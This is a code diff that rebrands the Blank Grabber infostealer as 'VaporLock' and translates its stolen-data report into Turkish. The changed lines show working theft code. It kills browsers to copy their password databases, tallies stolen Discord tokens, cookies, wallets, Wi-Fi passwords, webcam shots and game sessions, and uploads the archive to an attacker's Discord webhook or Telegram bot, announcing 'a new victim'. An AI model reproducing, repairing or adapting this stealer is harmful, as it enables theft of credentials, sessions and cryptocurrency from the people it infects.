@@ -1,5 +1,3 @@
-# pip install pyaesm urllib3
-
 import base64
 import os
 import subprocess
@@ -54,7 +52,7 @@ ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 
 logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
 for _, logger in logging.root.manager.loggerDict.items():
     logger.disabled = True
-Logger = logging.getLogger('Blank Grabber')
+Logger = logging.getLogger('VaporLock')
 Logger.setLevel(logging.INFO)
 if not Settings.Debug:
     Logger.disabled = True
@@ -446,35 +444,10 @@ class Browsers:
                     tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                     if not os.path.isfile(tempfile):
                         break
-                # Fixed: use robust file copy to bypass exclusive locks
                 try:
-                    # Ensure process is killed and wait (already done before calling this method)
-                    # Use kernel32 to copy with FILE_SHARE_READ | FILE_SHARE_WRITE
-                    kernel32 = ctypes.windll.kernel32
-                    GENERIC_READ = 0x80000000
-                    FILE_SHARE_READ = 0x00000001
-                    FILE_SHARE_WRITE = 0x00000002
-                    OPEN_EXISTING = 3
-                    FILE_ATTRIBUTE_NORMAL = 0x80
-                    h_src = kernel32.CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
-                    if h_src == -1:
-                        raise Exception('Could not open source file')
-                    h_dst = kernel32.CreateFileW(tempfile, 0x40000000, 0, None, 2, FILE_ATTRIBUTE_NORMAL, None)
-                    if h_dst == -1:
-                        kernel32.CloseHandle(h_src)
-                        raise Exception('Could not create temp file')
-                    buf = ctypes.create_string_buffer(4096)
-                    bytes_read = wintypes.DWORD()
-                    while kernel32.ReadFile(h_src, buf, 4096, ctypes.byref(bytes_read), None) and bytes_read.value:
-                        kernel32.WriteFile(h_dst, buf, bytes_read.value, ctypes.byref(wintypes.DWORD()), None)
-                    kernel32.CloseHandle(h_dst)
-                    kernel32.CloseHandle(h_src)
+                    shutil.copy(path, tempfile)
                 except Exception:
-                    # fallback to shutil.copy if robust method fails
-                    try:
-                        shutil.copy(path, tempfile)
-                    except Exception:
-                        continue
+                    continue
                 db = sqlite3.connect(tempfile)
                 db.text_factory = lambda b: b.decode(errors='ignore')
                 cursor = db.cursor()
@@ -806,7 +779,7 @@ class BlankGrabber:
     GrowtopiaStolen: bool = False
 
     def __init__(self) -> None:
-        self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+        self.Separator = '\n\n' + 'VaporLock'.center(50, '=') + '\n\n'
         while True:
             self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
             if not os.path.isfile(self.ArchivePath):
@@ -1153,9 +1126,7 @@ class BlankGrabber:
 
                 def run(name, path):
                     try:
-                        # Kill browser process and wait to release locks
                         Utility.TaskKill(procname)
-                        time.sleep(2)
                         browser = Browsers.Chromium(path)
                         saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                         passwords = browser.GetPasswords() if Settings.CapturePasswords else None
@@ -1329,7 +1300,7 @@ class BlankGrabber:
         extention = self.CreateArchive()
         if not os.path.isfile(self.ArchivePath):
             raise FileNotFoundError('Failed to create archive')
-        filename = 'Blank-%s.%s' % (os.getlogin(), extention)
+        filename = 'VaporLock-%s.%s' % (os.getlogin(), extention)
         computerName = os.getenv('computername') or 'Unable to get computer name'
         computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
         computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
@@ -1353,13 +1324,13 @@ class BlankGrabber:
             ipinfo = '(Unable to get IP info)'
         else:
             ipinfo = data
-        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
-        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
+        system_info = f'Bilgisayar Adı: {computerName}\nİşletim Sistemi: {computerOS}\nToplam Ram: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nÜrün Anahtarı: {productKey}'
+        collection = {'Discord Hesapları': self.DiscordTokensCount, 'Şifreler': self.PasswordsCount, 'Kurabiyeler': len(self.Cookies), 'Geçmiş': self.HistoryCount, 'Otomatik Doldurmalar': self.AutofillCount, 'Roblox Kurabiyeleri': self.RobloxCookiesCount, 'Telegram Oturumları': self.TelegramSessionsCount, 'Sıradan Dosyalar': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Şifreleri': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Oturumları': self.MinecraftSessions, 'Epic Oturumları': 'Yes' if self.EpicStolen else 'No', 'Steam Oturumları': 'Yes' if self.SteamStolen else 'No', 'Uplay Oturumları': 'Yes' if self.UplayStolen else 'No', 'Growtopia Oturumları': 'Yes' if self.GrowtopiaStolen else 'No', 'Ekran Görüntüsü': 'Yes' if self.ScreenshotTaken else 'No', 'Sistem Bilgisi': 'Yes' if self.SystemInfoStolen else 'No'}
         grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
         match Settings.C2[0]:
             case 0:
-                image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
+                image_url = 'https://raw.githubusercontent.com/WEJUEKNII/parrse/refs/heads/main/vaporlock.png'
+                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'VaporLock', 'description': f'**__Sistem Bilgileri__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Toplanan Bilgi__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Yapımcı:Croxlv | Tüm bilgiler VaporLock tarafından çekilmiştir.'}, 'thumbnail': {'url': image_url}}], 'username': 'VaporLock', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
@@ -1374,7 +1345,7 @@ class BlankGrabber:
                 fields['payload_json'] = json.dumps(payload).encode()
                 http.request('POST', Settings.C2[1], fields=fields)
             case 1:
-                payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
+                payload = {'caption': f'<b>VaporLock</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Toplanan Bilgi</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
